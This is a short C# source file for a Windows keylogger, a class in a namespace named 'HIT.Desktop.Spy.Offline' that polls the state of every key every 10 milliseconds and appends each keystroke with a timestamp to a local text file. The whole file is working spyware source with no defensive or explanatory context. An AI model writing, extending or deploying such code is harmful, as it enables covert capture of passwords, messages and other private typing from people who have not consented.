using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace HIT.Desktop.Spy.Offline
{
    public class Keylogger
    {
        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);

        public Task Start()
        {
            var filePath = @"KeysPressed.txt";

            using (var writer = new StreamWriter(filePath, true))
            {
                writer.AutoFlush = true;

                while (true)
                {
                    Thread.Sleep(10);

                    for (Int32 i = 0; i < 255; i++)
                    {
                        var keyState = GetAsyncKeyState(i);

                        if (keyState == 1 || keyState == -32767)
                        {
                            var key = (Keys)i;

                            if (key != Keys.LButton && key != Keys.RButton)
                            {
                                writer.WriteLine($"[{DateTime.Now}] - {key}");
                            }
                        }
                    }
                }
            }
        }
    }
}
